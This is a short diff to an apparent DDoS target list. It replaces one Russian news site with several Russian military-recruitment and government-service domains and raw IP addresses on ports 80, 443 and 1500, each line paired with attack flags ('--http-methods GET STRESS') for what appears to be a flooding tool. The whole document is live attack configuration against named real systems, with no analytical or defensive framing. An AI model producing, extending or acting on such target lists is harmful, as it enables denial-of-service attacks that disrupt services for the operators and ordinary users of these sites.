@@ -17,6 +17,7 @@ https://digital.gov.ru/ tcp://212.164.137.119:80 tcp://212.164.137.119:443 --htt
 
 
 #ddos separiv
-
-https://riafan.ru tcp://178.248.238.21:80 tcp://178.248.238.21:443 --http-methods GET STRESS
+http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 --http-methods GET STRESS
+http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 --http-methods GET STRESS
+tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 
 
